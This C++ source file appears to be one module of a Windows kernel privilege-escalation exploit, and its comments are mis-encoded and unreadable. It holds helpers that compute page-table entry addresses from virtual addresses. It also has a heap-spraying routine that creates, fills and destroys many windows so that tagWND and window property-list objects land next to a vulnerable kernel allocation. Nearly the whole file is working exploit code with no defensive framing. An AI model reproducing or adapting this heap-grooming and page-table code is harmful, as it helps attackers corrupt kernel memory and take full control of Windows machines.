// �Ȱ������Լ��ķ���ʵ�ַ�ˮ���ְ�....
// ����һ���Լ��ķ���
// ʹ��setPropA�����з�ˮ���� 0x18 + 0x10 * n
#include "spray.h"
#include "kernelLeaks.h"
#include "assist.h"
#include <windows.h>

const char * wndClassName = "pwndWnd";
HWND zombiepwndPropList[hwndCount] = {};
HWND pwndWnd[hwndCount ] = {};
HWND sprayWnd_3[hwndCount ] = {};
HWND sprayWnd_1[hwndCount] = {};
HWND vulPropList[hwndCount ] = {};
HWND sprayWnd_2[hwndCount] = {};
HWND sprayWnd_4[hwndCount ] = {};
HWND sprayWnd_5[hwndCount ] = {};
HWND sprayWnd_6[hwndCount] = {};

BOOL initFlag = TRUE;
#define _HEAP_BLOCK_SIZE 0x10
LARGE_UNICODE_STRING o1lstr, o2lstr, o3lstr, o4lstr, o5lstr;

// ���������ں˵�ַ�ĺ���
UINT64 getPTfromVA(UINT64 vaddr)
{
	vaddr >>= 9;
	vaddr >>= 3;
	vaddr <<= 3;
	vaddr &= 0xfffff6ffffffffff;
	vaddr |= 0xfffff68000000000;
	return vaddr;
}

UINT64 getPDfromVA(UINT64 vaddr)
{
	vaddr >>= 18;
	vaddr >>= 3;
	vaddr <<= 3;
	vaddr &= 0xfffff6fb7fffffff;
	vaddr |= 0xfffff6fb40000000;
	return vaddr;
}

UINT64 getPDPTfromVA(UINT64 vaddr)
{
	vaddr >>= 27;
	vaddr >>= 3;
	vaddr <<= 3;
	vaddr &= 0xfffff6fb7dbfffff;
	vaddr |= 0xfffff6fb7da00000;
	return vaddr;
}

UINT64 getPML4fromVA(UINT64 vaddr)
{
	vaddr >>= 36;
	vaddr >>= 3;
	vaddr <<= 3;
	vaddr &= 0xfffff6fb7dbedfff;
	vaddr |= 0xfffff6fb7dbed000;
	return vaddr;
}




// �е�СС���鷳...


LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}

	return 0;
}

VOID
NTAPI
RtlInitLargeUnicodeString(IN OUT PLARGE_UNICODE_STRING DestinationString,
	IN PCWSTR SourceString,
	IN INT Unknown,
	IN INT datasize = 0)
{
	ULONG DestSize;

	if (datasize != 0)
	{
		DestSize = datasize;
		DestinationString->Length = DestSize;
		DestinationString->MaximumLength = DestSize + sizeof(WCHAR);
	}
	else if (SourceString)
	{
		DestSize = (ULONG)wcslen(SourceString) * sizeof(WCHAR);
		DestinationString->Length = DestSize;
		DestinationString->MaximumLength = DestSize + sizeof(WCHAR);
	}
	else
	{
		DestinationString->Length = 0;
		DestinationString->MaximumLength = 0;
	}

	DestinationString->Buffer = (PWSTR)SourceString;
	DestinationString->bAnsi = FALSE;
}


VOID sprayObject()
{
	// textӦ���������
	CHAR o1str[0x1e0 - _HEAP_BLOCK_SIZE] = { 0 };
	CHAR o2str[0x1b0 - _HEAP_BLOCK_SIZE] = { 0 };
	CHAR o3str[0x180 - _HEAP_BLOCK_SIZE] = { 0 };
	CHAR o4str[0x30 - _HEAP_BLOCK_SIZE] = { 0 };
	CHAR o5str[0x30 - _HEAP_BLOCK_SIZE] = { 0 };

	

	memset(o1str, '\x40', 0x1e0 - _HEAP_BLOCK_SIZE);
	RtlInitLargeUnicodeString(&o1lstr, (WCHAR*)o1str, (UINT)-1, 0x1e0 - _HEAP_BLOCK_SIZE - 2);

	memset(o2str, '\x41', 0x1b0 - _HEAP_BLOCK_SIZE);
	RtlInitLargeUnicodeString(&o2lstr, (WCHAR*)o2str, (UINT)-1, 0x1b0 - _HEAP_BLOCK_SIZE - 2);

	memset(o3str, '\x42', 0x180 - _HEAP_BLOCK_SIZE);
	RtlInitLargeUnicodeString(&o3lstr, (WCHAR*)o3str, (UINT)-1, 0x180 - _HEAP_BLOCK_SIZE - 2);

	memset(o4str, '\x43', 0x30 - _HEAP_BLOCK_SIZE);
	RtlInitLargeUnicodeString(&o4lstr, (WCHAR*)o4str, (UINT)-1, 0x30 - _HEAP_BLOCK_SIZE - 2);

	memset(o5str, '\x50', 0x30 - _HEAP_BLOCK_SIZE);
	RtlInitLargeUnicodeString(&o5lstr, (WCHAR*)o5str, (UINT)-1, 0x30 - _HEAP_BLOCK_SIZE - 2);

	initWindows(sprayWnd_1, hwndCount);
	initWindows(sprayWnd_2, hwndCount );
	initWindows(sprayWnd_3, hwndCount );
	initWindows(sprayWnd_4, hwndCount );
	initWindows(sprayWnd_5, hwndCount );
	initWindows(sprayWnd_6, hwndCount );
	initWindows(zombiepwndPropList, hwndCount );
	initWindows(vulPropList, hwndCount );

	// ������п�
	for (int i = 0; i < hwndCount; i++)
	{
		if (sprayWnd_1[i] != NULL)
			NtUserDefSetText(sprayWnd_1[i], &o1lstr);
	}	

	// �ͷŵõ�0x1e0
	for (int i = 0; i < hwndCount; i += 2)
	{
		if (sprayWnd_1[i] != NULL)
			DestroyWindow(sprayWnd_1[i]);
	}

	// ����0x1b0
	for (int i = 0; i < hwndCount; i ++)
	{
		if (sprayWnd_2[i] != NULL)
			NtUserDefSetText(sprayWnd_2[i], &o2lstr);
	}

	// ���0x30
	for (int i = 0; i < hwndCount ; i++)
	{
		if (sprayWnd_3[i] != NULL)
			NtUserDefSetText(sprayWnd_3[i], &o5lstr);
	}
	
	// �ͷ�0x1b0
	for (int i = 0; i < hwndCount ; i++)
	{
		if (sprayWnd_2[i] != NULL)
			DestroyWindow(sprayWnd_2[i]);
	}

	// ���0x180
	for (int i = 0; i < hwndCount ; i++)
	{
		if (sprayWnd_4[i] != NULL)
			NtUserDefSetText(sprayWnd_4[i], &o3lstr);
	}

	// ���0x30
	for (int i = 0; i < hwndCount ; i++)
	{
		if (sprayWnd_5[i] != NULL)
			NtUserDefSetText(sprayWnd_5[i], &o4lstr);
	}

	// �ͷ�0x180
	for (int i = 0; i < hwndCount ; i++)
	{
		if(sprayWnd_4[i] != NULL)
			DestroyWindow(sprayWnd_4[i]);
	}
	
	// ���tagWND
	initWindows(pwndWnd, hwndCount );

	
	// ��������һ����
	for (int i = 1; i < hwndCount; i += 2)
	{
		if (sprayWnd_1[i] != NULL)
			DestroyWindow(sprayWnd_1[i]);
	}

	// ����0x1b0
	for (int i = 0; i < hwndCount ; i++)
	{
		if (sprayWnd_6[i] != NULL)
			NtUserDefSetText(sprayWnd_6[i], &o2lstr);
	}

	// zombie proplist
	for (int i = 0; i < hwndCount ; i++)
	{
		if (zombiepwndPropList[i] != NULL)
		{
			NtUserDefSetText(zombiepwndPropList[i], &o4lstr);
		}
	}

	// ������
	// �ͷ�0x1b0
	for (int i = 0; i < hwndCount; i++)
	{
		if (sprayWnd_6[i] != NULL)
			DestroyWindow(sprayWnd_6[i]);
	}

	// ����0x180
	for (int i = 0; i < hwndCount ; i++)
	{
		if (vulPropList[i] != NULL)
			NtUserDefSetText(vulPropList[i], &o3lstr);
	}


}

/*****************************************
* ����:
* hwndCreate: ��ų��ش��ڵ�����
* hwndNum: ���һ����Ҫ���ٸ�����
***********/
VOID initWindows(HWND *hwndCreate, int hwndNum )
{
	WNDCLASSEXA wc;
	
	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = DefWindowProcA;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = GetModuleHandleA(NULL);
	wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
	wc.lpszMenuName = NULL;
	wc.lpszClassName = wndClassName;
	wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);

	if (initFlag)	//ע��ֻע��һ��
	{
		if (!RegisterClassExA(&wc))	// ע�ᴰ��
		{
			if (GetLastError() != ERROR_CLASS_ALREADY_EXISTS)
				return ;
		}
		initFlag = FALSE;
	}

	for (int i = 0; i < hwndNum; i++)
	{
		hwndCreate[i] = CreateWindowExA(
			0,
			wndClassName,
			0,
			NULL,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			(HWND)NULL,
			(HMENU)NULL,
			NULL,
			(PVOID)NULL
		);	
		if (!hwndCreate[i]) std::cout << "ERROR: " << GetLastError() << std::endl;
	}

}
